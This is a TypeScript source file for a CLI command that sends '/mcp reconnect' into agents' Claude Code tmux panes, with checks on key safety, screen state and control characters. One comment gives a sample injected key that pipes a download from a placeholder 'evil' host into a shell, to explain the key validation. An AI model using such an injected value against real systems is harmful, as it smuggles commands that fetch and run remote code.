/**
 *
 *	@Project: @cldmv/gh-broker
 *	@Filename: /src/cli/reconnect.ts
 *	@Date: 2026-11-21T00:00:00-08:00 (1795248000)
 *	@Author: Nate Corcoran <CLDMV>
 *	@Email: <Shinrai@users.noreply.github.com>
 *	-----
 *	@Last modified by: Nate Corcoran <CLDMV> (Shinrai@users.noreply.github.com)
 *	@Last modified time: 2026-11-22T21:08:27-08:00 (1795410507)
 *	-----
 *	@Copyright: Copyright (c) 2013-2026 Catalyzed Motivation Inc. All rights reserved.
 *
 */

/**
 * `gh-broker agent reconnect` (#223): send `/mcp reconnect <key>` to each running Claude Code
 * session of a registered agent (or one agent). The key is the agent's actual `mcpServers` entry
 * for the broker, read back from its `.claude.json` files — mcp-config.ts writes those entries, so
 * brokerKeyOf knows what one looks like wherever it is. The sessions are found as root through
 * every tmux server the agent user runs (src/cli/tmux.ts), but every tmux command runs AS THE
 * AGENT, so root never types into a server the agent itself couldn't reach. Nothing is typed into
 * a pane unless its input box is on screen and empty (no dialog, nobody typing), Claude is the
 * pane's foreground job, the key is one that can't carry a newline or shell metacharacter, and the
 * screen is re-captured just before sending. Claude working doesn't block a send: Claude Code
 * queues what is typed while it works; skipped panes are listed with their id and a reason so they can be retried.
 * Every effect is injected.
 */
import { agentsDir, assertAgentName, registeredAgents, type Group, type UserInfo } from "./agents.ts";
import { brokerKeyOf, extraFolders, inFolder, MCP_FILE, type FolderIo, type Place } from "./mcp-config.ts";
import { TmuxTimeout, type Pane, type TmuxServer, type TmuxServers } from "./tmux.ts";
import type { ConfigLayer } from "./config-merge.ts";

/** The systemd unit a backgrounded --wait runs as. */
export const WAIT_UNIT = "gh-broker-reconnect-wait";

export const RECONNECT_HELP = `agent reconnect [<user>] [--dry-run] [--wait <time> [--foreground]]
[--session <name|%pane>]

Sends "/mcp reconnect <key>" to every running Claude Code session of a
registered agent (or all of them): the ones still on an old socat entry,
or whose connect bridge did not recover from a broker restart.
<key> is the agent's actual mcpServers entry for the broker, read back from
its .claude.json files. A pane is skipped, with its id and the reason, when
someone is typing in it, a dialog (a permission prompt, a question, a menu)
is showing, it is in copy mode, or its key is not one that is safe to type
blind. Claude working in it is fine: what is typed is queued.
--session <name|%pane> (repeatable) keeps only the panes whose tmux session
name or pane id matches (a value that matches nothing is reported).
--dry-run lists what it would send where. --wait <time> (e.g. 90s, 5m; at
most 30m) keeps checking the panes skipped for text in the input box or a
dialog every few seconds, and sends to each once it is clear; the ones still
blocked when the time is up are skipped. The waiting runs in the background
(a systemd unit, ${WAIT_UNIT}, so the command returns at once and the
wait survives the terminal closing; follow it with
journalctl -u ${WAIT_UNIT} -f). A new --wait replaces one still running.
--foreground waits here instead. Exits 0 when every pane was sent to (or
handed to the background wait), 3 when some were skipped (run it again once
they're clear), 1 when a named user doesn't exist or a --session matched
no pane.`;

/** The effects `agent reconnect` (and `upgrade`'s last step) use. */
export interface ReconnectDeps {
	log: (m: string) => void;
	error: (m: string) => void;
	groups: () => Group[];
	userInfo: (user: string) => UserInfo | undefined;
	mcpIO: FolderIo;
	/** The agent's tmux servers: socket + the binary that owns it, and the sockets skipped (dead, or no owning server process found). */
	tmuxSockets: (info: UserInfo) => TmuxServers;
	/** The Claude Code panes on one tmux server, with their screen and foreground/mode state. */
	tmuxPanes: (server: TmuxServer, info: UserInfo) => Pane[];
	/** Re-capture one pane's screen right before sending; undefined when the pane is gone. */
	tmuxPaneText: (server: TmuxServer, pane: string, info: UserInfo) => string | undefined;
	/** Send literal text to a pane as the agent and press Enter (tmux send-keys -l, then a separate Enter). */
	tmuxSend: (server: TmuxServer, pane: string, text: string, info: UserInfo) => void;
	/** The clock and a blocking pause, for --wait. */
	now: () => number;
	sleep: (ms: number) => void;
	/**
	 * Run `gh-broker agent reconnect <args>` as the WAIT_UNIT systemd unit, stopping one already
	 * running first, and return without waiting for it. Throws when the unit can't be started.
	 */
	startBackground: (args: string[]) => void;
}

/** How often --wait re-checks the panes it is waiting on. */
export const WAIT_POLL_MS = 5000;
/** The longest --wait accepted. */
export const MAX_WAIT_MS = 30 * 60 * 1000;

/** "90", "90s", "5m" -> milliseconds; undefined when it isn't one of those or is over MAX_WAIT_MS. */
export function parseWait(v: string): number | undefined {
	const m = /^(\d{1,4})(s|m)?$/.exec(v);
	if (!m) return undefined;
	const ms = Number(m[1]) * (m[2] === "m" ? 60_000 : 1000);
	return ms > 0 && ms <= MAX_WAIT_MS ? ms : undefined;
}

/**
 * Heuristics over Claude Code's screen, from the captured pane text (`capture-pane -e`, so SGR
 * attributes are kept; real captures of the current TUI are the test fixtures). The TUI changes
 * between versions, so they err toward skipping a pane: one is only sent to when its input line is
 * visibly empty. A skipped pane is listed with its id, so it can be retried.
 */

/** Any CSI escape (SGR colours and attributes, cursor moves) — dropped before matching screen shapes. */
// eslint-disable-next-line no-control-regex -- matching terminal escape sequences is the point
const CSI = /\x1b\[[0-9;:?]*[ -/]*[@-~]/g;

/**
 * One captured line as the user sees it, minus dim text: Claude Code draws its prompt suggestion
 * ("❯ continue") and the empty box's placeholder in SGR 2 (dim), and neither is typed text. Text
 * from an SGR 2 until an SGR 0 / 22 (or a bare reset) is dropped; every other escape is removed.
 */
export function undimmed(line: string): string {
	let out = "";
	let dim = false;
	let last = 0;
	// eslint-disable-next-line no-control-regex -- matching terminal escape sequences is the point
	for (const m of line.matchAll(/\x1b\[([0-9;:?]*)([ -/]*[@-~])/g)) {
		if (!dim) out += line.slice(last, m.index);
		last = m.index! + m[0].length;
		if (m[2] !== "m") continue;
		// Parameters are ";"-separated. A colour's arguments are skipped, not read as attributes:
		// 38/48/58 take "5;<n>" (256 colours) or "2;<r>;<g>;<b>" (truecolour), so the 2 in
		// "38;2;136;136;136" is not dim. The ":" form ("38:2::r:g:b") is one parameter.
		const params = m[1] === "" ? ["0"] : m[1]!.split(";");
		for (let k = 0; k < params.length; k++) {
			const p = params[k]!;
			if (p.includes(":")) continue;
			if (p === "38" || p === "48" || p === "58") {
				k += params[k + 1] === "5" ? 2 : params[k + 1] === "2" ? 4 : 0;
				continue;
			}
			if (p === "2") dim = true;
			else if (p === "0" || p === "" || p === "22") dim = false;
		}
	}
	if (!dim) out += line.slice(last);
	return out.replace(CSI, "");
}

/** The composer box's rule line ("────"). */
const RULE = /^\s*─+\s*$/;
/** Footer lines under the box — anchored to their shapes ("⏵⏵ … (shift+tab to cycle) · ↓ to manage", "? for shortcuts", the "◯" task bullet, the right-aligned "new task?"), so a draft's own continuation starting with "?" or "●" — or merely mentioning "to cycle" — doesn't end the scan. */
const FOOTER = /^\s*(?:⏵|◯|\? for shortcuts|new task\?)/;

/**
 * The state of Claude Code's input line in the pane: "empty" (a "❯"/"> " line with nothing typed —
 * the live box puts a no-break space after the "❯", and a dim prompt suggestion there isn't typed),
 * "typing" (text in it, or any non-blank line between it and the box's closing rule — a draft can
 * start with a blank first line), or "none" (no input line on screen — a dialog, or bash/memory
 * input mode). The live box is the bottom-most prompt line: user messages in the transcript carry
 * a "❯" too, but the box sits under them. A shell's PS2 continuation ("> ") can only show while
 * the shell owns the tty, in which case no claude is the pane's foreground job — the foreground
 * check catches that pane even when this reads "empty".
 */
export function composerState(text: string): "empty" | "typing" | "none" {
	const lines = text.split("\n").map((l) => undimmed(l).replace(/\s+$/, ""));
	for (let i = lines.length - 1; i >= 0; i--) {
		const m = /^[❯>](?:[ \u00a0](.*))?$/.exec(lines[i]!);
		if (!m) continue;
		for (let j = i + 1; j < lines.length; j++) {
			const below = lines[j]!;
			if (RULE.test(below) || FOOTER.test(below)) break;
			if (below.trim() !== "") return "typing";
		}
		return m[1]?.trim() ? "typing" : "empty";
	}
	return "none";
}

/**
 * A key that is safe to type blind into a pane: alphanumerics, "_", "." and "-", at most 64
 * characters. The agent controls its `mcpServers` key names, and send-keys -l delivers CR/LF as
 * Enter — a key like "github\r!curl evil|sh" would submit the reconnect and then run a command.
 */
export const safeKey = (key: string): boolean => /^[A-Za-z0-9_.-]{1,64}$/.test(key);

/** Control characters never reach root's terminal in a log line: a socket path, pane id or a tmux error message carrying C0 or C1 controls (U+009B is CSI on some terminals) is blanked out. */
// eslint-disable-next-line no-control-regex -- blanking control characters is the point
const clean = (s: string): string => s.replace(/[\x00-\x1f\x7f\x80-\x9f]/g, "?");

/** One pane a backgrounded --wait retries: `<user>:<pane>@<socket>` on its command line. */
interface Retry {
	user: string;
	pane: string;
	socket: string;
}
const RETRY = /^([a-z_][a-z0-9_-]*):(%\d+)@(\/.+)$/;

/** Split `agent reconnect` arguments into the agent users (at most one), --dry-run, --wait, --foreground, --session, --retry and --help. */
function parseReconnectArgs(rest: string[]): {
	users: string[];
	dryRun: boolean;
	help: boolean;
	waitMs: number;
	wait?: string;
	foreground: boolean;
	sessions: string[];
	retry?: Retry[];
} {
	const users: string[] = [];
	let dryRun = false;
	let help = false;
	let foreground = false;
	let retry: Retry[] | undefined;
	const sessions: string[] = [];
	let waitMs = 0;
	let wait: string | undefined;
	for (let i = 0; i < rest.length; i++) {
		const a = rest[i]!;
		if (a === "--dry-run") dryRun = true;
		else if (a === "-h" || a === "--help") help = true;
		else if (a === "--foreground") foreground = true;
		else if (a === "--session" || a.startsWith("--session=")) {
			const v = a === "--session" ? rest[++i] : a.slice("--session=".length);
			// A bare --session followed by another flag (or nothing) is a mistake, not a
			// session called "--dry-run": refuse it. --session=-x names that one explicitly.
			if (v === undefined || v === "" || (a === "--session" && v.startsWith("-")))
				throw new Error("--session takes a tmux session name or a pane id, e.g. --session main or --session %3");
			sessions.push(v);
		} else if (a === "--retry") {
			// Internal: the backgrounded --wait run gets the panes it waits on this way, and
			// touches no other pane.
			const m = RETRY.exec(rest[++i] ?? "");
			if (!m) throw new Error("--retry takes <user>:<pane>@<socket>");
			(retry ??= []).push({ user: m[1]!, pane: m[2]!, socket: m[3]! });
		} else if (a === "--wait" || a.startsWith("--wait=")) {
			const v = a === "--wait" ? rest[++i] : a.slice("--wait=".length);
			const ms = v === undefined ? undefined : parseWait(v);
			if (ms === undefined) throw new Error("--wait takes a time up to 30m, e.g. --wait 90s or --wait 5m");
			waitMs = ms;
			wait = v;
		} else if (a.startsWith("-")) throw new Error(`unknown flag: ${a}`);
		else users.push(a);
	}
	if (users.length > 1) throw new Error("name at most one agent user: sudo gh-broker agent reconnect [<user>]");
	if (foreground && waitMs === 0) throw new Error("--foreground is for --wait");
	if (retry && (waitMs === 0 || !foreground || users.length || dryRun)) throw new Error("--retry is for the background --wait run");
	// The background run already has its exact panes (--retry); the foreground run never forwards
	// --session to it.
	if (retry && sessions.length) throw new Error("--session is not for the background --wait run");
	return { users, dryRun, help, waitMs, foreground, sessions, ...(wait !== undefined ? { wait } : {}), ...(retry ? { retry } : {}) };
}

/**
 * The broker key in each of the agent's `.claude.json` files that has one, by folder. A folder
 * root won't read (SkippedFolder) or an unreadable file contributes no key.
 */
function keysOf(places: Place[], info: UserInfo, dir: string, d: { mcpIO: FolderIo }): Map<string, string> {
	const keys = new Map<string, string>();
	for (const place of places) {
		try {
			const key = inFolder(place, info, d, (io) => brokerKeyOf(io.read(`${place.folder}/${MCP_FILE}`, info.uid)?.text, dir));
			if (key) keys.set(place.folder, key);
		} catch {
			// the folder can't be used: it contributes no key
		}
	}
	return keys;
}

/**
 * The key to send to a pane: the one in the session's own config folder's file, else the home
 * file's. A pane whose own session folder has no broker entry is skipped, not guessed at — some
 * other folder's key may be wrong for that session.
 */
function keyFor(pane: Pane, info: UserInfo, keys: Map<string, string>): string | undefined {
	return (pane.configDir && keys.get(pane.configDir)) || keys.get(info.home);
}

/**
 * Run one `agent reconnect`. Returns the exit code: 0 when every pane found was sent to (or
 * there were none), 3 when some were only skipped (they can be retried), 1 when a user is missing
 * or a --session matched no pane.
 */
export function reconnect(rest: string[], config: ConfigLayer, d: ReconnectDeps): number {
	const { users, dryRun, help, waitMs, wait, foreground, retry, sessions } = parseReconnectArgs(rest);
	if (help) {
		d.log(RECONNECT_HELP);
		return 0;
	}
	const dir = agentsDir(config.listen);
	const registered = registeredAgents(d.groups()).map((a) => a.user);
	for (const user of users.length ? users : [...new Set(retry?.map((r) => r.user))]) {
		assertAgentName(user);
		if (!registered.includes(user)) throw new Error(`"${user}" is not a registered agent`);
	}
	let sent = 0;
	let skipped = 0;
	let missing = 0;
	// --session keeps only the panes whose exact tmux session name or pane id matches. A pane it
	// excludes is not listed at all; a value that matches no pane anywhere in the run is reported
	// at the end, and fails the run.
	const matched = new Set<string>();
	const wanted = (pane: Pane): boolean => {
		if (sessions.length === 0) return true;
		const hit = sessions.filter((s) => s === pane.session || s === pane.id);
		for (const s of hit) matched.add(s);
		return hit.length > 0;
	};
	// The pane's session and working directory, cleaned, printed after its id. Computed once at
	// selection time: the waiting loop holds no Pane, so --wait lines carry it on the entry.
	const where = (pane: Pane): string => ` (${clean(pane.session)}, ${clean(pane.cwd)})`;
	const skip = (user: string, socket: string, pane: string, key: string | undefined, why: string, loc = ""): void => {
		d.log(`${user} ${clean(socket)} ${clean(pane)}${loc} ${key ?? "-"} skipped (${why})`);
		skipped++;
	};
	// With --wait, a pane blocked only by text in its input box or a dialog is set aside and
	// re-checked until it clears or the time runs out, instead of being skipped now.
	const waiting: {
		user: string;
		socket: string;
		server: TmuxServer;
		info: UserInfo;
		pane: string;
		key: string;
		why: string;
		loc: string;
	}[] = [];
	const blocked = (
		user: string,
		socket: string,
		server: TmuxServer,
		info: UserInfo,
		pane: string,
		key: string,
		why: string,
		loc: string
	): void => {
		if (waitMs > 0 && !dryRun) {
			d.log(`${user} ${clean(socket)} ${clean(pane)}${loc} ${key} waiting (${why})`);
			waiting.push({ user, socket, server, info, pane, key, why, loc });
		} else skip(user, socket, pane, key, why, loc);
	};
	// A background run looks only at the users and panes it was handed.
	const retrying = (user: string, socket: string, pane: string): boolean =>
		!retry || retry.some((r) => r.user === user && r.socket === socket && r.pane === pane);
	for (const user of users.length ? users : retry ? [...new Set(retry.map((r) => r.user))] : registered) {
		const info = d.userInfo(user);
		if (!info) {
			d.error(`${user}: no such user`);
			skipped++;
			missing++;
			continue;
		}
		const places: Place[] = [{ folder: info.home, saved: false }, ...extraFolders(info, d, config, user)];
		const keys = keysOf(places, info, dir, d);
		let panes = 0;
		let listed = 0; // panes seen before the --session filter, for the no-sessions line below
		const { servers, skipped: deadSockets } = d.tmuxSockets(info);
		// Socket files whose tmux server has exited are leftovers, not sessions: one count line, not one line each.
		if (deadSockets.length)
			d.log(
				`${user}: ${deadSockets.length} stale tmux socket${deadSockets.length === 1 ? "" : "s"} ignored (no tmux server running on ${deadSockets.length === 1 ? "it" : "them"})`
			);
		for (const server of servers) {
			const socket = server.socket;
			let panesOnServer: Pane[];
			try {
				panesOnServer = d.tmuxPanes(server, info);
			} catch (err) {
				if (err instanceof TmuxTimeout) {
					d.log(`${user} ${clean(socket)} - skipped (tmux timed out)`);
					skipped++;
					continue;
				}
				throw err;
			}
			listed += panesOnServer.length;
			for (const pane of panesOnServer) {
				if (!retrying(user, socket, pane.id)) continue;
				if (!wanted(pane)) continue;
				panes++;
				if (pane.timedOut) {
					skip(user, socket, pane.id, undefined, "tmux timed out", where(pane));
					continue;
				}
				if (pane.inMode) {
					skip(user, socket, pane.id, undefined, "pane is in copy mode", where(pane));
					continue;
				}
				if (pane.synchronized) {
					skip(user, socket, pane.id, undefined, "synchronize-panes is on", where(pane));
					continue;
				}
				// tmux pane ids are %<number>; anything else from the (agent-controlled) server is
				// not typed at, and only its cleaned form reaches the log.
				if (!/^%\d+$/.test(pane.id)) {
					skip(user, socket, pane.id, undefined, "unsafe pane id", where(pane));
					continue;
				}
				const key = keyFor(pane, info, keys);
				if (!key) {
					skip(user, socket, pane.id, undefined, "no broker MCP entry in its .claude.json files", where(pane));
					continue;
				}
				if (!safeKey(key)) {
					skip(user, socket, pane.id, undefined, "unsafe MCP key", where(pane));
					continue;
				}
				if (!pane.foreground) {
					skip(user, socket, pane.id, key, "claude is not the pane's foreground job", where(pane));
					continue;
				}
				const composer = composerState(pane.text);
				if (composer !== "empty") {
					blocked(
						user,
						socket,
						server,
						info,
						pane.id,
						key,
						composer === "typing" ? "composer not empty, or a dialog is showing" : "no Claude Code prompt on screen",
						where(pane)
					);
					continue;
				}
				if (dryRun) {
					d.log(`${user} ${clean(socket)} ${clean(pane.id)}${where(pane)} ${key} would send`);
				} else {
					// Re-capture between the check and the send: the operator may have started
					// typing (or the pane died) while the checks ran.
					let fresh: string | undefined;
					try {
						fresh = d.tmuxPaneText(server, pane.id, info);
					} catch (err) {
						if (!(err instanceof TmuxTimeout)) throw err;
						skip(user, socket, pane.id, key, "tmux timed out", where(pane));
						continue;
					}
					if (fresh === undefined) {
						skip(user, socket, pane.id, key, "gone since capture", where(pane));
						continue;
					}
					if (composerState(fresh) !== "empty") {
						blocked(user, socket, server, info, pane.id, key, "changed since capture", where(pane));
						continue;
					}
					try {
						d.tmuxSend(server, pane.id, `/mcp reconnect ${key}`, info);
					} catch (err) {
						skip(user, socket, pane.id, key, `send failed: ${clean((err as Error).message)}`, where(pane));
						continue;
					}
					d.log(`${user} ${clean(socket)} ${clean(pane.id)}${where(pane)} ${key} sent`);
				}
				sent++;
			}
		}
		// With --session, panes the filter dropped are not listed. The "no sessions" line stays for
		// an agent that had no Claude panes at all (so "no pane matched --session X" is not the only
		// output), and is suppressed only when panes existed and the filter dropped them all.
		if (panes === 0 && (sessions.length === 0 || listed === 0))
			d.log(
				retry
					? `${user}: the panes waited on are gone`
					: `${user}: no Claude Code sessions running${servers.length ? "" : " (no tmux server)"}`
			);
	}
	let backgrounded = 0;
	if (waiting.length > 0 && !foreground) {
		const args = ["--wait", wait!, "--foreground", ...waiting.flatMap((w) => ["--retry", `${w.user}:${w.pane}@${w.socket}`])];
		try {
			d.startBackground(args);
			backgrounded = waiting.length;
			d.log(
				`waiting up to ${wait} in the background for ${waiting.length} pane${waiting.length === 1 ? "" : "s"} to clear: journalctl -u ${WAIT_UNIT} -f`
			);
			waiting.length = 0;
		} catch (err) {
			d.error(`couldn't start the background wait (${clean((err as Error).message)}); waiting here instead`);
		}
	}
	if (waiting.length > 0) {
		d.log(`waiting up to ${wait} for ${waiting.length} pane${waiting.length === 1 ? "" : "s"} to clear`);
		const deadline = d.now() + waitMs;
		while (waiting.length > 0 && d.now() < deadline) {
			d.sleep(Math.min(WAIT_POLL_MS, Math.max(0, deadline - d.now())));
			for (let i = waiting.length - 1; i >= 0; i--) {
				const w = waiting[i]!;
				let text: string | undefined;
				try {
					text = d.tmuxPaneText(w.server, w.pane, w.info);
				} catch (err) {
					if (!(err instanceof TmuxTimeout)) throw err;
					continue; // tmux didn't answer this round; try again next round
				}
				if (text === undefined) {
					waiting.splice(i, 1);
					skip(w.user, w.socket, w.pane, w.key, "gone while waiting", w.loc);
					continue;
				}
				if (composerState(text) !== "empty") continue;
				waiting.splice(i, 1);
				try {
					d.tmuxSend(w.server, w.pane, `/mcp reconnect ${w.key}`, w.info);
				} catch (err) {
					skip(w.user, w.socket, w.pane, w.key, `send failed: ${clean((err as Error).message)}`, w.loc);
					continue;
				}
				d.log(`${w.user} ${clean(w.socket)} ${clean(w.pane)}${w.loc} ${w.key} sent`);
				sent++;
			}
		}
		for (const w of waiting) skip(w.user, w.socket, w.pane, w.key, `${w.why}; still after waiting ${wait}`, w.loc);
	}
	// A --session that matched no pane anywhere is the operator's typo to see, not a silent zero.
	const unmatched = sessions.filter((s) => !matched.has(s));
	for (const s of unmatched) d.error(`no pane matched --session ${clean(s)}`);
	d.log(
		dryRun
			? `dry run: ${sent} pane(s) would get "/mcp reconnect"`
			: `sent ${sent}, skipped ${skipped}${backgrounded ? `, waiting on ${backgrounded} in the background` : ""}`
	);
	if (unmatched.length) return 1;
	if (skipped === 0) return 0;
	return missing > 0 ? 1 : 3;
}
